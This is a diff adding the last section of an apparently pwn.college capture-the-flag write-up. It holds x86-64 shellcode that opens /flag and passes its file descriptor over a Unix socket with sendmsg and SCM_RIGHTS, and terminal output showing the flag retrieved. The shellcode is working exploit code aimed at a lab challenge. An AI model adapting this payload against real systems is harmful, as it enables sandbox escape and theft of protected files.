@@ -2297,4 +2297,80 @@ $ sudo ./relay-wrapper
 [Server] Successfully sent file descriptor.
 ```
 
-Last step towards the flag 
+Last step towards the flag is to create the shellcode to replicate the functionality of the server. Compared with Day 5, ths one is straight-forward:
+```nasm
+	sub rsp, 0x300                  /* Allocate local stack space */
+
+	lea rdi, [rsp + 0x200]
+	mov rax, 0x67616c662f           /* Write "/flag" into memory */
+	mov qword ptr [rdi], rax
+	mov byte ptr [rdi+5], 0
+
+	mov rax, 257
+	mov rdi, -100
+	lea rsi, [rsp + 0x200]
+	xor rdx, rdx
+	xor r10, r10
+	syscall                         /* openat(AT_FDCWD=-100, pathname, O_RDONLY=0) */
+
+	mov r12d, eax                   /* save flag_fd */
+
+	lea r14, [rsp + 0x1E0]          /* Dummy data for iovec */
+	mov rax, 0x4141414142424242
+	mov [r14], rax
+
+	lea r13, [rsp + 0x1C0]          /* struct iovec */
+	mov [r13], r14
+	mov qword ptr [r13+8], 8
+
+	lea rbx, [rsp + 0x100]          /* struct cmsghdr (x86-64 layout) */
+	mov qword ptr [rbx+0], 24       /* cmsg_len = CMSG_LEN(sizeof(int)) = 8+4+4+4 (align) = 24 */
+	mov dword ptr [rbx+8], 1        /* cmsg_level = SOL_SOCKET */
+	mov dword ptr [rbx+12], 1       /* cmsg_type  = SCM_RIGHTS */
+	mov dword ptr [rbx+16], r12d    /* CMSG_DATA (FD) starts at offset +16 */
+
+	lea r15, [rsp + 0x180]          /* struct msghdr */
+
+	mov qword ptr [r15+0x00], 0      /* msg_name     */
+	mov qword ptr [r15+0x08], 0      /* msg_namelen  */
+	mov qword ptr [r15+0x10], r13    /* msg_iov      */
+	mov qword ptr [r15+0x18], 1      /* msg_iovlen   */
+	mov qword ptr [r15+0x20], rbx    /* msg_control  */
+	mov qword ptr [r15+0x28], 24     /* msg_controllen (must match real space) */
+	mov qword ptr [r15+0x30], 0      /* msg_flags    */
+
+	mov rax, 46
+	mov rdi, 3
+	mov rsi, r15
+	xor rdx, rdx
+	syscall                           /* sendmsg(3, &msghdr, 0) */
+
+	mov rax, 231
+	xor rdi, rdi
+	syscall                           /* exit_group(0) */
+```
+
+Let's chain everything together to get the flag:
+```bash
+(Terminal 1) The client listener
+$ ./client
+[Client] Listening on socket: ./socket_path
+[Client] Server connected. Preparing to receive FD.
+[Client] Received 8 bytes of dummy data.
+[Client] SUCCESSFULLY RECEIVED FILE DESCRIPTOR: 3
+File contents: pwn.college{practice}
+
+(Terminal 2) Wrapper over the challenge binary
+./wrapper
+📡 Tuning to Santa's reserved frequency...
+💾 Loading incoming elf firmware packet...
+🧝 Protecting station from South Pole elfs...
+
+(Terminal 3) Feed the shellcode via a FIFO
+$ python relay.py
+Press ENTER to send shellcode payload to fifo...
+```
+
+<div class="box-note">
+I'm sure there's a more elegant solution that having 3 terminals and using a fifo to transmit the payload but I got used to this setup because it helps with debugging in GDB.
+</div>
